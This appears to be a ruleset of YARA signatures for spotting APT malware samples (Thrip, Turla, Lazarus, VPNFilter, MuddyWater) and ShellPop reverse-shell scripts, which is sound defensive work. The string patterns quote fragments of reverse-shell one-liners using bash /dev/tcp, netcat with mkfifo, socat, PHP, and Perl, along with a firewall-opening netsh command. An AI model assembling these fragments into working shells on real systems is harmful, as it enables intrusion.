rule APT_Thrip_Sample_Jun18_6_RID2FA7 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Windows\\system32\\Instell.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
} 

rule APT_Thrip_Sample_Jun18_7_RID2FA8 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\runme.exe" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 1 of them
} 

rule APT_Thrip_Sample_Jun18_8_RID2FA9 : APT DEMO G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "$.oS.Run('cmd.exe /c '+a+'" fullword ascii
      $x2 = "new $._x('WScript.Shell');" ascii
      $x3 = ".ExpandEnvironmentStrings('%Temp%')+unescape('" ascii
   condition: 
      filesize < 10KB and 1 of ( $x* )
} 

rule APT_Thrip_Sample_Jun18_9_RID2FAA : APT DEMO EXE FILE G0076 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:06:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "a7f0714e82b3105031fa7bc89dfe7664" or pe.imphash ( ) == "8812ff21aeb160e8800257140acae54b" or pe.imphash ( ) == "44a1e904763fe2d0837c747c7061b010" or pe.imphash ( ) == "51a854d285aa12eb82e76e6e1be01573" or pe.imphash ( ) == "a1f457c8c549c5c430556bfe5887a4e6" )
} 

rule APT_Thrip_Sample_Jun18_11_RID2FD3 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:13:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "\\AppData\\Local\\Temp\\dw20.EXE" ascii
      $s2 = "C:\\Windows\\system32\\sysprep\\cryptbase.dll" fullword ascii
      $s3 = "WFQNJMBWF" fullword ascii
      $s4 = "SQLWLWZSF" fullword ascii
      $s5 = "PFQUFQSBPP" fullword ascii
      $s6 = "WQZXQFPVOW" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "6eef4394490378f32d134ab3bf4bf194" or all of them )
} 

rule APT_Thrip_Sample_Jun18_12_RID2FD4 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:13:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "pGlobal->nOSType==64--%s\\cmd.exe %s" fullword ascii
      $s2 = "httpcom.log" fullword ascii
      $s3 = "\\CryptBase.dll" fullword ascii
      $s4 = "gupdate.exe" fullword ascii
      $s5 = "wusa.exe" fullword ascii
      $s6 = "/c %s %s /quiet /extract:%s\\%s\\" fullword ascii
      $s7 = "%s%s.dll.cab" fullword ascii
      $s8 = "/c %s\\%s\\%s%s %s" fullword ascii
      $s9 = "ReleaseEvildll" fullword ascii
      $s0 = "%s\\%s\\%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 6 of them
} 

rule APT_Thrip_Sample_Jun18_13_RID2FD5 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko" fullword ascii
      $s2 = "<member><name>password</name>" fullword ascii
      $s3 = "<value><string>qqtorspy</string></value>" fullword ascii
      $s4 = "SOFTWARE\\QKitTORSPY" fullword wide
      $s5 = "ipecho.net" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "3dfad33b2fb66c083c99dc10341908b7" or 4 of them )
} 

rule APT_Thrip_Sample_Jun18_14_RID2FD6 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "%SystemRoot%\\System32\\svchost.exe -k " fullword ascii
      $s2 = "spdirs.dll" fullword ascii
      $s3 = "Provides storm installation services such as Publish, and Remove." fullword ascii
      $s4 = "RegSetValueEx(Svchost\\netsvcs)" fullword ascii
      $s5 = "Load %s Error" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( "InstallA" ) and pe.exports ( "InstallB" ) and pe.exports ( "InstallC" ) ) or all of them )
} 

rule APT_Thrip_Sample_Jun18_10_RID2FD2 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "!This Program cannot be run in DOS mode." fullword ascii
      $x2 = "!this program cannot be run in dos mode." fullword ascii
      $s1 = "svchost.dll" fullword ascii
      $s2 = "constructor or from DllMain." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( $x1 or 2 of them )
} 

rule APT_Thrip_Sample_Jun18_15_RID2FD7 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "%s\\cmd.exe /c %s" fullword ascii
      $s2 = "CryptBase.dll" fullword ascii
      $s3 = "gupdate.exe" fullword ascii
      $s4 = "wusa.exe" fullword ascii
      $s5 = "/c %s %s /quiet /extract:%s\\%s\\" fullword ascii
      $s6 = "%s%s.dll.cab" fullword ascii
      $s7 = "%s\\%s\\%s%s %s" fullword ascii
      $s8 = "%s\\%s\\%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "f6ec70a295000ab0a753aa708e9439b4" or 6 of them )
} 

rule APT_Thrip_Sample_Jun18_16_RID2FD8 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "[%d] Failed, %08X" fullword ascii
      $s2 = "woqunimalegebi" fullword ascii
      $s3 = "[%d] Offset can not fetched." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of them or pe.imphash ( ) == "c6a4c95d868a3327a62c9c45f5e15bbf" )
} 

rule APT_Thrip_Sample_Jun18_17_RID2FD9 : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "c:\\users\\administrator\\desktop\\code\\skeyman2\\" ascii
      $x2 = "\\SkeyMan2.pdb" ascii
      $x3 = "\\\\.\\Pnpkb" fullword ascii
      $s1 = "\\DosDevices\\Pnpkb" fullword wide
      $s2 = "\\DosDevices\\PnpKb" fullword wide
      $s3 = "\\Driver\\kbdhid" fullword wide
      $s4 = "\\Device\\PnpKb" fullword wide
      $s5 = "Microsoft  Windows Operating System" fullword wide
      $s6 = "hDevice == INVALID_HANDLE_VALUE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) and 1 of ( $s* ) )
} 

rule APT_Thrip_Sample_Jun18_18_RID2FDA : APT DEMO EXE FILE G0076 T1136 {
   meta:
      description = "Detects sample found in Thrip report by Symantec "
      author = "Florian Roth"
      reference = "https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets "
      date = "2018-06-21 12:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key" fullword ascii
      $s2 = "Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard" fullword ascii
      $s3 = "LoadLibraryA() failed in KbdGetProcAddressByName()" fullword ascii
      $s5 = "Unknown Virtual-Key Code" fullword ascii
      $s6 = "Computer Sleep key" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them
} 

rule PLEAD_Downloader_Jun18_1_RID2F6A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects PLEAD Downloader"
      author = "Florian Roth"
      reference = "https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html"
      date = "2018-06-16 11:56:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%02d:%02d:%02d" ascii fullword
      $s2 = "%02d-%02d-%02d" ascii fullword
      $s3 = "1111%02d%02d%02d_%02d%02d2222" ascii fullword
      $a1 = "Scanning..." wide fullword
      $a2 = "Checking..." wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or ( 2 of ( $s* ) and 1 of ( $a* ) ) )
} 

rule APT_Turla_Agent_BTZ_Gen_1_RID3003 : APT DEMO EXE FILE G0010 GEN RUSSIA T1136 {
   meta:
      description = "Detects Turla Agent.BTZ"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-06-16 12:21:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0010, GEN, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s" fullword ascii
      $s1 = "release mutex - %u (%u)(%u)" fullword ascii
      $s2 = "\\system32\\win.com" fullword ascii
      $s3 = "Command Id:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)" fullword ascii
      $s4 = "MakeFile Error(%d) copy file to temp file %s" fullword ascii
      $s5 = "%s%%s08x.tmp" fullword ascii
      $s6 = "Run instruction: %d ID:%u%010u(%02d:%02d:%02d %02d/%02d/%04d)" fullword ascii
      $s7 = "Mutex_Log" fullword ascii
      $s8 = "%s\\system32\\winview.ocx" fullword ascii
      $s9 = "Microsoft(R) Windows (R) Operating System" fullword wide
      $s10 = "Error: pos(%d) > CmdSize(%d)" fullword ascii
      $s11 = "\\win.com" fullword ascii
      $s12 = "Error(%d) run %s " fullword ascii
      $s13 = "%02d.%02d.%04d Log begin:" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == "9d0d6daa47d6e6f2d80eb05405944f87" or ( pe.exports ( "Entry" ) and pe.exports ( "InstallM" ) and pe.exports ( "InstallS" ) ) or $x1 or 3 of them ) or ( 5 of them )
} 

rule APT_NK_AR18_165A_1_RID2C15 : APT DEMO EXE FILE NK T1089 T1136 {
   meta:
      description = "Detects APT malware from AR18-165A report by US CERT"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/analysis-reports/AR18-165A"
      date = "2018-06-15 09:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, NK, T1089, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "netsh.exe advfirewall firewall add rule name=\"PortOpenning\" dir=in protocol=tcp localport=%d action=allow enable=yes" fullword wide
      $s2 = "netsh.exe firewall add portopening TCP %d \"PortOpenning\" enable" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule MAL_MuddyWater_DroppedTask_Jun18_1_RID3395 : APT DEMO FILE G0069 T1136 {
   meta:
      description = "Detects a dropped Windows task as used by MudyWater in June 2018"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/719c94eb-0a00-47cc-b583-ad4f9e25ebdb"
      date = "2018-06-12 14:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, G0069, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%11%\\scrobj.dll,NI,c:" wide
      $s1 = "AppAct = \"SOFTWARE\\Microsoft\\Connection Manager\"" fullword wide
      $s2 = "[DefenderService]" fullword wide
      $s3 = "UnRegisterOCXs=EventManager" fullword wide
      $s4 = "ShortSvcName=\" \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0xfeff and filesize < 1KB and ( 1 of ( $x* ) or 3 of them )
} 

rule APT_Lazarus_Dropper_Jun18_1_RID30F7 : APT DEMO EXE FILE G0032 MAL NK T1136 {
   meta:
      description = "Detects Lazarus Group Dropper"
      author = "Florian Roth"
      reference = "https://twitter.com/DrunkBinary/status/1002587521073721346"
      date = "2018-06-01 13:02:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, MAL, NK, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = /%s\\windows10-kb[0-9]{7}.exe/ fullword ascii
      $s2 = "EYEJIW" fullword ascii
      $s3 = "update" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 21000KB and ( pe.imphash ( ) == "fcac768eff9896d667a7c706d70712ce" or all of them )
} 

rule APT_Lazarus_RAT_Jun18_2_RID2F03 : APT DEMO EXE FILE G0032 MAL NK T1136 {
   meta:
      description = "Detects Lazarus Group RAT"
      author = "Florian Roth"
      reference = "https://twitter.com/DrunkBinary/status/1002587521073721346"
      date = "2018-06-01 11:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0032, MAL, NK, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\KB\\Release\\" ascii
      $s3 = "KB, Version 1.0" fullword wide
      $s4 = "TODO: (c) <Company name>.  All rights reserved." fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them
} 

rule MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX T1136 {
   meta:
      description = "Detects VPNFilter malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Login=" fullword ascii
      $s2 = "Password=" fullword ascii
      $s3 = "%s/rep_%u.bin" fullword ascii
      $s4 = "%s:%uh->%s:%hu" fullword ascii
      $s5 = "Password required" fullword ascii
      $s6 = "password=" fullword ascii
      $s7 = "Authorization: Basic" fullword ascii
      $s8 = "/tmUnblock.cgi" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them
} 

rule MAL_ELF_VPNFilter_2_RID2D6B : APT DEMO FILE LINUX T1136 {
   meta:
      description = "Detects VPNFilter malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0)" fullword ascii
      $s2 = "passwordPASSWORDpassword" fullword ascii
      $s3 = "/tmp/client.key" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them
} 

rule MAL_ELF_VPNFilter_3_RID2D6C : APT DEMO FILE LINUX T1136 {
   meta:
      description = "Detects VPNFilter malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:31:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX, T1136"
      minimum_yara = "1.7"
      
   strings:
      $sx1 = "User-Agent: Mozilla/6.1 (compatible; MSIE 9.0; Windows NT 5.3; Trident/5.0)" fullword ascii
      $sx2 = "Execute by shell[%d]:" fullword ascii
      $sx3 = "CONFIG.TOR.name:" fullword ascii
      $s1 = "Executing command:  %s %s..." fullword ascii
      $s2 = "/proc/%d/cmdline" fullword ascii
      $a1 = "Mozilla/5.0 Firefox/50.0" fullword ascii
      $a2 = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" fullword ascii
      $a3 = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 1000KB and ( 1 of ( $sx* ) or 2 of ( $s* ) or 2 of ( $a* ) )
} 

rule SUSP_ELF_Tor_Client_RID2DE4 : APT DEMO FILE LINUX SUSP T1136 {
   meta:
      description = "Detects ELF Linux Tor client"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, LINUX, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "We needed to load a secret key from %s, but it was encrypted. Try 'tor --keygen' instead, so you can enter the passphrase." fullword ascii
      $x2 = "Received a VERSION cell with odd payload length %d; closing connection." fullword ascii
      $x3 = "Please upgrade! This version of Tor (%s) is %s, according to the directory authorities. Recommended versions are: %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and 1 of them
} 

rule HKTL_shellpop_TCLsh_RID2E27 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects suspicious TCLsh popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:02:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "{ puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if" ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule HKTL_shellpop_ruby_RID2E2B : DEMO HKTL T1136 {
   meta:
      description = "Detects suspicious ruby shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:03:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ");while(cmd=c.gets);IO.popen(cmd,'r'){" ascii
   condition: 
      filesize < 1KB and all of them
} 

rule HKTL_shellpop_awk_RID2DAC : DEMO HKTL T1136 {
   meta:
      description = "Detects suspicious AWK Shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 10:41:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "awk 'BEGIN {s = \"/inet/tcp/0/" ascii
      $s2 = "; while(42) " ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule HKTL_shellpop_Netcat_UDP_RID3010 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects suspicious netcat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 12:23:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "mkfifo fifo ; nc.traditional -u" ascii
      $s2 = "< fifo | { bash -i; } > fifo" fullword ascii
   condition: 
      filesize < 1KB and 1 of them
} 

rule HKTL_shellpop_socat_RID2E83 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects suspicious socat popshell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:17:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "socat tcp-connect" ascii
      $s2 = ",pty,stderr,setsid,sigint,sane" ascii
   condition: 
      filesize < 1KB and 2 of them
} 

rule HKTL_shellpop_Perl_RID2DFC : DEMO HKTL T1136 {
   meta:
      description = "Detects Shellpop Perl script"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 10:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
      $ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
   condition: 
      filesize < 2KB and 1 of them
} 

rule HKTL_shellpop_Python_RID2EEB : DEMO HKTL SCRIPT T1136 T1146 {
   meta:
      description = "Detects malicious python shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SCRIPT, T1136, T1146"
      minimum_yara = "1.7"
      
   strings:
      $ = "os.putenv('HISTFILE', '/dev/null');" ascii
   condition: 
      filesize < 2KB and 1 of them
} 

rule HKTL_shellpop_PHP_TCP_RID2E97 : DEMO HKTL T1100 T1136 {
   meta:
      description = "Detects malicious PHP shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:21:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1100, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "php -r \"\\$sock=fsockopen" ascii
      $x2 = ";exec('/bin/sh -i <&3 >&3 2>&3');\"" ascii
   condition: 
      filesize < 3KB and all of them
} 

rule HKTL_shellpop_Powershell_TCP_RID31D4 : DEMO HKTL T1086 T1136 {
   meta:
      description = "Detects malicious powershell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 13:39:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "Something went wrong with execution of command on the target" ascii
      $ = ";[byte[]]$bytes = 0..65535|%{0};$sendbytes =" ascii
   condition: 
      filesize < 3KB and 1 of them
} 

rule SUSP_Powershell_ShellCommand_May18_1_RID3475 : DEMO HKTL SUSP T1086 T1136 {
   meta:
      description = "Detects a supcicious powershell commandline"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 15:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SUSP, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "powershell -nop -ep bypass -Command" ascii
   condition: 
      filesize < 3KB and 1 of them
} 

rule HKTL_shellpop_Telnet_TCP_RID301B : DEMO HKTL T1136 {
   meta:
      description = "Detects malicious telnet shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 12:25:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
      $x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
   condition: 
      filesize < 3KB and 1 of them
} 

rule SUSP_shellpop_Bash_RID2DFF : DEMO HKTL SUSP T1136 {
   meta:
      description = "Detects susupicious bash command"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 10:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "/bin/bash -i >& /dev/tcp/" ascii
   condition: 
      1 of them
} 

rule HKTL_shellpop_netcat_RID2EE8 : DEMO HKTL T1136 {
   meta:
      description = "Detects suspcious netcat shellpop"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:34:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
      $s2 = "fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc" ascii
      $s4 = "mknod /tmp/f p && nc" ascii
      $s5 = "</tmp/f|/bin/bash 1>/tmp/f" ascii
   condition: 
      filesize < 2KB and 1 of them
